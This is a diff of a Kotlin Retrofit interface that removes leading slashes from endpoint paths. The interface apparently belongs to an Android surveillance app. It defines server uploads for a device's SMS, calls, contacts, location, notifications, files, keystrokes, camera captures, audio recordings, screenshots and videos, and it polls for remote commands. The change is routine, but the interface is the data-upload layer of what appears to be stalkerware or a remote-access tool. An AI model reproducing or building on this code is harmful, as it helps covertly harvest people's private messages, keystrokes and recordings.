@@ -30,110 +30,110 @@ import retrofit2.http.Query
 
 interface ApiService {
 
-    @GET("/api/server/config")
+    @GET("api/server/config")
     suspend fun getServerConfig(): Response<com.example.data.model.ServerConfigResponse>
 
-    @GET("/health")
+    @GET("health")
     suspend fun getHealth(): Response<com.example.data.model.ServerConfigResponse>
 
-    @POST("/api/auth/register")
+    @POST("api/auth/register")
     suspend fun registerUser(
         @Body request: AuthRequest
     ): Response<AuthResponse>
 
-    @POST("/api/auth/login")
+    @POST("api/auth/login")
     suspend fun loginUser(
         @Body request: AuthRequest
     ): Response<AuthResponse>
 
-    @POST("/api/devices/register-device")
+    @POST("api/devices/register-device")
     suspend fun registerDevice(
         @Header("Authorization") userToken: String,
         @Body request: RegisterDeviceRequest
     ): Response<PairingResponse>
 
-    @POST("/api/devices/pair")
+    @POST("api/devices/pair")
     suspend fun pairDevice(
         @Body request: PairingRequest
     ): Response<PairingResponse>
 
-    @POST("/api/devices/{id}/telemetry")
+    @POST("api/devices/{id}/telemetry")
     suspend fun syncTelemetry(
         @Header("Authorization") token: String,
         @Path("id") deviceId: String,
         @Body telemetry: DeviceTelemetry
     ): Response<Unit>
 
-    @POST("/api/devices/{id}/location")
+    @POST("api/devices/{id}/location")
     suspend fun syncLocation(
         @Header("Authorization") token: String,
         @Path("id") deviceId: String,
         @Body location: LocationData
     ): Response<Unit>
 
-    @POST("/api/devices/{id}/notifications")
+    @POST("api/devices/{id}/notifications")
     suspend fun syncNotification(
         @Header("Authorization") token: String,
         @Path("id") deviceId: String,
         @Body notification: NotificationData
     ): Response<Unit>
 
-    @POST("/api/devices/{id}/apps")
+    @POST("api/devices/{id}/apps")
     suspend fun syncApps(
         @Header("Authorization") token: String,
         @Path("id") deviceId: String,
         @Body apps: List<AppInfoData>
     ): Response<Unit>
 
-    @POST("/api/devices/{id}/contacts")
+    @POST("api/devices/{id}/contacts")
     suspend fun syncContacts(
         @Header("Authorization") token: String,
         @Path("id") deviceId: String,
         @Body contacts: List<com.example.data.model.ContactData>
     ): Response<Unit>
 
-    @POST("/api/devices/{id}/sms")
+    @POST("api/devices/{id}/sms")
     suspend fun syncSMS(
         @Header("Authorization") token: String,
         @Path("id") deviceId: String,
         @Body smsList: List<com.example.data.model.SmsData>
     ): Response<Unit>
 
-    @POST("/api/devices/{id}/calls")
+    @POST("api/devices/{id}/calls")
     suspend fun syncCalls(
         @Header("Authorization") token: String,
         @Path("id") deviceId: String,
         @Body calls: List<com.example.data.model.CallData>
     ): Response<Unit>
 
-    @POST("/api/devices/{id}/usage")
+    @POST("api/devices/{id}/usage")
     suspend fun syncUsage(
         @Header("Authorization") token: String,
         @Path("id") deviceId: String,
         @Body usage: List<UsageData>
     ): Response<Unit>
 
-    @POST("/api/devices/{id}/files")
+    @POST("api/devices/{id}/files")
     suspend fun syncFiles(
         @Header("Authorization") token: String,
         @Path("id") deviceId: String,
         @Body files: List<com.example.data.model.DeviceFileData>
     ): Response<Unit>
 
-    @PUT("/api/devices/{id}/permissions")
+    @PUT("api/devices/{id}/permissions")
     suspend fun updatePermissions(
         @Header("Authorization") token: String,
         @Path("id") deviceId: String,
         @Body permissions: DevicePermissionsStatus
     ): Response<Unit>
 
-    @GET("/api/devices/{id}/commands/pending")
+    @GET("api/devices/{id}/commands/pending")
     suspend fun getPendingCommands(
         @Header("Authorization") token: String,
         @Path("id") deviceId: String
     ): Response<List<RemoteCommand>>
 
-    @POST("/api/devices/{id}/commands/{commandId}/status")
+    @POST("api/devices/{id}/commands/{commandId}/status")
     suspend fun updateCommandStatus(
         @Header("Authorization") token: String,
         @Path("id") deviceId: String,
@@ -142,7 +142,7 @@ interface ApiService {
     ): Response<Unit>
 
     @Multipart
-    @POST("/api/devices/{id}/camera")
+    @POST("api/devices/{id}/camera")
     suspend fun uploadCameraCapture(
         @Header("Authorization") token: String,
         @Path("id") deviceId: String,
@@ -151,7 +151,7 @@ interface ApiService {
     ): Response<Unit>
 
     @Multipart
-    @POST("/api/devices/{id}/recordings")
+    @POST("api/devices/{id}/recordings")
     suspend fun uploadAudioRecording(
         @Header("Authorization") token: String,
         @Path("id") deviceId: String,
@@ -160,7 +160,7 @@ interface ApiService {
     ): Response<Unit>
 
     @Multipart
-    @POST("/api/devices/{id}/upload-file")
+    @POST("api/devices/{id}/upload-file")
     suspend fun uploadGenericFile(
         @Header("Authorization") token: String,
         @Path("id") deviceId: String,
@@ -169,7 +169,7 @@ interface ApiService {
     ): Response<Unit>
 
     @Multipart
-    @POST("/api/devices/{id}/screenshots")
+    @POST("api/devices/{id}/screenshots")
     suspend fun uploadScreenshot(
         @Header("Authorization") token: String,
         @Path("id") deviceId: String,
@@ -180,7 +180,7 @@ interface ApiService {
     ): Response<Unit>
 
     @Multipart
-    @POST("/api/devices/{id}/videos")
+    @POST("api/devices/{id}/videos")
     suspend fun uploadVideo(
         @Header("Authorization") token: String,
         @Path("id") deviceId: String,
@@ -188,14 +188,14 @@ interface ApiService {
         @Part("durationMs") durationMs: RequestBody
     ): Response<Unit>
 
-    @POST("/api/devices/{id}/keystrokes")
+    @POST("api/devices/{id}/keystrokes")
     suspend fun syncKeystrokes(
         @Header("Authorization") token: String,
         @Path("id") deviceId: String,
         @Body keystrokes: List<com.example.data.model.KeystrokeData>
     ): Response<Unit>
 
-    @DELETE("/api/devices/{id}/disconnect")
+    @DELETE("api/devices/{id}/disconnect")
     suspend fun disconnectDevice(
         @Header("Authorization") token: String,
         @Path("id") deviceId: String
